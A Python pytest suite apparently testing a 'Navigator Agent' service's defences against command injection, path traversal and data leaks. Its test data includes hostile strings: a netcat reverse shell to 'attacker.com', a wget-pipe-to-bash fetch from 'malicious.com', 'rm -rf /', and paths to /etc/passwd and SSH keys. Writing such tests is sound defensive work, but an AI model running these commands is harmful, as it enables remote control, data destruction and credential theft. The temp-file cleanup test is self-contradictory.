"""
Security Tests for Navigator Agent

Tests security controls including:
- Authentication and authorization
- Input validation and sanitization
- Command injection prevention
- Path traversal protection
- Rate limiting
- Data exposure prevention
- Secure configuration validation
"""

import os

# Import the services
import sys
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from fastapi.testclient import TestClient

sys.path.insert(0, str(Path(__file__).parent.parent))

from runner import app as runner_app
from web_interface import web_app


class TestAuthentication:
    """Test authentication and authorization."""

    @pytest.fixture
    def runner_client(self):
        """Test client for Runner service."""
        return TestClient(runner_app)

    def test_unauthorized_access_prevention(self, runner_client):
        """Test that unauthorized access is prevented."""
        # All endpoints should be accessible without authentication
        # but commands should be restricted by allow-list
        response = runner_client.get("/health")
        assert response.status_code == 200

        response = runner_client.get("/")
        assert response.status_code == 200

    def test_allow_list_authorization(self, runner_client):
        """Test allow-list based authorization."""
        # Test allowed command
        response = runner_client.post("/run", json={"cmd_id": "build", "args": {}})
        assert response.status_code in [200, 500]  # Success or connection error

        # Test disallowed command
        response = runner_client.post(
            "/run", json={"cmd_id": "forbidden_command", "args": {}}
        )
        assert response.status_code == 403
        data = response.json()
        assert "not in allow-list" in data["detail"]


class TestInputValidation:
    """Test input validation and sanitization."""

    @pytest.fixture
    def runner_client(self):
        """Test client for Runner service."""
        return TestClient(runner_app)

    @pytest.fixture
    def web_client(self):
        """Test client for Web interface."""
        return TestClient(web_app)

    def test_command_id_validation(self, runner_client):
        """Test command ID validation."""
        # Valid command IDs
        valid_ids = ["build", "validate", "run", "logs", "introspect"]

        for cmd_id in valid_ids:
            response = runner_client.post("/run", json={"cmd_id": cmd_id, "args": {}})
            # Should not fail due to invalid command ID format
            assert response.status_code != 400 or "cmd_id" not in response.json().get(
                "detail", ""
            )

        # Invalid command IDs
        invalid_ids = [
            "build!",
            "build test",
            "build;rm",
            "build&&echo",
            "build`echo`",
            "build$(echo)",
            "build\nnew",
            "build\t",
            "build" + "x" * 100,  # Too long
        ]

        for cmd_id in invalid_ids:
            response = runner_client.post("/run", json={"cmd_id": cmd_id, "args": {}})
            assert response.status_code == 400
            data = response.json()
            assert "cmd_id" in data["detail"] or "must contain only" in data["detail"]

    def test_run_id_validation(self, runner_client):
        """Test run_id validation for logs command."""
        # Valid run IDs
        valid_run_ids = [
            "run_123",
            "test-run-456",
            "demo_run_789",
            "a",
            "1",
            "run_123_abc_456",
        ]

        for run_id in valid_run_ids:
            response = runner_client.post(
                "/run", json={"cmd_id": "logs", "args": {"run_id": run_id}}
            )
            # Should not fail due to run_id validation
            if response.status_code == 400:
                assert "run_id" not in response.json().get("detail", "")

        # Invalid run IDs (containing whitespace or special chars)
        invalid_run_ids = [
            "run 123",
            "run\n123",
            "run\t123",
            "run;123",
            "run&&123",
            "run||123",
            "run`123`",
            "run$(123)",
        ]

        for run_id in invalid_run_ids:
            response = runner_client.post(
                "/run", json={"cmd_id": "logs", "args": {"run_id": run_id}}
            )
            assert response.status_code == 400
            data = response.json()
            assert "Invalid run_id format" in data["detail"]


class TestPathTraversal:
    """Test path traversal attack prevention."""

    @pytest.fixture
    def runner_client(self):
        """Test client for Runner service."""
        return TestClient(runner_app)

    @pytest.fixture
    def web_client(self):
        """Test client for Web interface."""
        return TestClient(web_app)

    def test_path_traversal_prevention_runner(self, runner_client):
        """Test path traversal prevention in Runner service."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "../../../.bashrc",
            "..\\..\\..\\.bash_history",
            "/root/.ssh/id_rsa",
            "C:\\Users\\Administrator\\.ssh\\id_rsa",
        ]

        for malicious_path in malicious_paths:
            response = runner_client.post(
                "/run", json={"cmd_id": "validate", "args": {"file": malicious_path}}
            )
            # Should fail with validation error
            assert response.status_code in [400, 500]

            if response.status_code == 400:
                data = response.json()
                assert "Invalid path" in data["detail"] or "outside" in data["detail"]

    def test_path_traversal_prevention_web(self, web_client):
        """Test path traversal prevention in Web interface."""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
        ]

        for malicious_path in malicious_paths:
            response = web_client.post("/api/validate", data={"file": malicious_path})
            # Should fail with validation error
            assert response.status_code in [400, 500]

            if response.status_code == 400:
                data = response.json()
                assert "Invalid path" in data["detail"] or "outside" in data["detail"]

    def test_null_byte_injection(self, runner_client, web_client):
        """Test null byte injection prevention."""
        null_byte_paths = [
            "../../../etc/passwd\x00.json",
            "..\\..\\..\\windows\\system32\\config\x00.json",
        ]

        for path in null_byte_paths:
            # Test via Runner API
            response = runner_client.post(
                "/run", json={"cmd_id": "validate", "args": {"file": path}}
            )
            assert response.status_code in [400, 500]

            # Test via Web interface
            response = web_client.post("/api/validate", data={"file": path})
            assert response.status_code in [400, 500]


class TestCommandInjection:
    """Test command injection attack prevention."""

    @pytest.fixture
    def runner_client(self):
        """Test client for Runner service."""
        return TestClient(runner_app)

    def test_shell_injection_prevention(self, runner_client):
        """Test prevention of shell injection attacks."""
        injection_attempts = [
            "test.json; rm -rf /",
            "test.json && cat /etc/passwd",
            "test.json | ls -la",
            "test.json || echo hacked",
            "test.json`cat /etc/passwd`",
            "test.json$(cat /etc/passwd)",
            "test.json;echo hacked > /tmp/hacked",
            "test.json|nc -e /bin/bash attacker.com 4444",
        ]

        for injection in injection_attempts:
            response = runner_client.post(
                "/run", json={"cmd_id": "validate", "args": {"file": injection}}
            )
            # Should either fail validation or succeed without injection
            assert response.status_code in [200, 400, 500]

            # If it succeeds, the command should not have executed the injection
            if response.status_code == 200:
                # The response should be about validation, not the injected command
                data = response.json()
                assert "ok" in data  # Should be a normal response

    def test_command_separator_injection(self, runner_client):
        """Test injection with command separators."""
        separators = [";", "&", "&&", "||", "|", "`", "$", "\n", "\r"]

        for separator in separators:
            injection = f"test.json{separator}echo hacked"
            response = runner_client.post(
                "/run", json={"cmd_id": "validate", "args": {"file": injection}}
            )
            assert response.status_code in [200, 400, 500]

    def test_argument_injection(self, runner_client):
        """Test injection through command arguments."""
        # Try to inject arguments that could be dangerous
        dangerous_args = [
            "--help; rm -rf /",
            "../../../../../etc/passwd",
            "-o /dev/null; cat /etc/passwd",
            "; wget http://malicious.com/script.sh -O- | bash ;",
        ]

        for dangerous_arg in dangerous_args:
            response = runner_client.post(
                "/run", json={"cmd_id": "validate", "args": {"file": dangerous_arg}}
            )
            assert response.status_code in [400, 500]


class TestRateLimiting:
    """Test rate limiting functionality."""

    @pytest.fixture
    def runner_client(self):
        """Test client for Runner service."""
        return TestClient(runner_app)

    def test_rate_limit_enforcement(self, runner_client):
        """Test that rate limiting is enforced."""
        # Make multiple requests quickly
        responses = []
        for _ in range(10):  # More than the 5 req/min limit
            response = runner_client.get("/health")
            responses.append(response.status_code)

        # At least one should be rate limited (429)
        rate_limited_responses = [code for code in responses if code == 429]
        assert len(rate_limited_responses) > 0, "Rate limiting not working"

    def test_rate_limit_different_endpoints(self, runner_client):
        """Test rate limiting across different endpoints."""
        endpoints = ["/health", "/introspect"]

        responses = []
        for _ in range(15):  # Make many requests
            for endpoint in endpoints:
                response = runner_client.get(endpoint)
                responses.append((endpoint, response.status_code))

        # Should eventually hit rate limit on some endpoint
        rate_limited = any(code == 429 for _, code in responses)
        assert rate_limited, "Rate limiting not working across endpoints"


class TestDataExposure:
    """Test prevention of sensitive data exposure."""

    @pytest.fixture
    def runner_client(self):
        """Test client for Runner service."""
        return TestClient(runner_app)

    def test_error_message_sanitization(self, runner_client):
        """Test that error messages don't expose sensitive information."""
        # Try to trigger various error conditions
        error_conditions = [
            "/nonexistent/path.json",
            "invalid.json",
            "/etc/passwd",
            "../../../.env",
        ]

        for invalid_path in error_conditions:
            response = runner_client.post(
                "/run", json={"cmd_id": "validate", "args": {"file": invalid_path}}
            )

            if response.status_code >= 400:
                data = response.json()
                error_msg = data.get("detail", "").lower()

                # Error messages should not contain sensitive paths
                assert "/etc/passwd" not in error_msg
                assert "/root" not in error_msg
                assert "C:\\Windows" not in error_msg
                assert ".env" not in error_msg

    def test_response_sanitization(self, runner_client):
        """Test that responses don't contain sensitive data."""
        response = runner_client.get("/health")
        data = response.json()

        # Response should not contain sensitive information
        assert "password" not in str(data).lower()
        assert "secret" not in str(data).lower()
        assert "key" not in str(data).lower()
        assert "token" not in str(data).lower()


class TestSecureConfiguration:
    """Test secure configuration validation."""

    def test_allowlist_file_security(self):
        """Test that allow-list file is properly secured."""
        from runner import ALLOWLIST_FILE

        # Allow-list file should exist
        assert ALLOWLIST_FILE.exists()

        # File should be readable
        assert ALLOWLIST_FILE.is_file()

        # Check file permissions (should not be world-writable)
        import stat

        file_stat = ALLOWLIST_FILE.stat()
        permissions = stat.filemode(file_stat.st_mode)

        # Should not be world-writable
        assert (
            "w" not in permissions[-1]
        ), "Allow-list file should not be world-writable"

    def test_project_root_security(self):
        """Test that project root is properly configured."""
        from runner import PROJECT_ROOT

        # Project root should be a directory
        assert PROJECT_ROOT.is_dir()

        # Should not be world-writable
        import stat

        dir_stat = PROJECT_ROOT.stat()
        permissions = stat.filemode(dir_stat.st_mode)

        # Should not be world-writable
        assert "w" not in permissions[-1], "Project root should not be world-writable"

    def test_environment_variable_security(self):
        """Test that sensitive environment variables are not exposed."""
        # Check that sensitive env vars are not in process environment
        sensitive_vars = [
            "PASSWORD",
            "SECRET",
            "KEY",
            "TOKEN",
            "API_KEY",
            "DATABASE_URL",
            "REDIS_URL",
            "AWS_SECRET",
        ]

        for var in sensitive_vars:
            value = os.environ.get(var)
            if value is not None:
                # If the variable exists, it should be masked or not a real secret
                assert (
                    "example" in value.lower()
                    or "test" in value.lower()
                    or len(value) < 10
                )

    def test_temp_file_cleanup(self):
        """Test that temporary files are properly cleaned up."""
        import tempfile

        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            tmp_path = Path(tmp.name)
            tmp.write(b"test content")
            tmp.flush()

            # File should exist during operation
            assert tmp_path.exists()

        # File should be automatically deleted after context
        assert not tmp_path.exists()


class TestNetworkSecurity:
    """Test network security controls."""

    @pytest.fixture
    def runner_client(self):
        """Test client for Runner service."""
        return TestClient(runner_app)

    def test_cors_headers(self, runner_client):
        """Test CORS headers are properly set."""
        response = runner_client.get("/health")

        # Check CORS headers
        headers = response.headers
        assert "access-control-allow-origin" in headers
        assert "access-control-allow-methods" in headers
        assert "access-control-allow-headers" in headers

        # Origin should be restricted, not "*"
        origin = headers.get("access-control-allow-origin", "")
        assert origin != "*", "CORS origin should be restricted"

    def test_content_security_policy(self, runner_client):
        """Test Content Security Policy headers."""
        response = runner_client.get("/health")

        # Check for CSP header
        headers = response.headers
        csp = headers.get("content-security-policy")
        if csp:
            # Should restrict script sources
            assert "script-src" in csp
            assert "'self'" in csp or "'none'" in csp

    def test_http_headers_security(self, runner_client):
        """Test various security headers."""
        response = runner_client.get("/health")
        headers = response.headers

        # Check for security headers
        security_headers = [
            "x-content-type-options",
            "x-frame-options",
            "x-xss-protection",
            "strict-transport-security",
        ]

        for header in security_headers:
            assert header in headers, f"Missing security header: {header}"
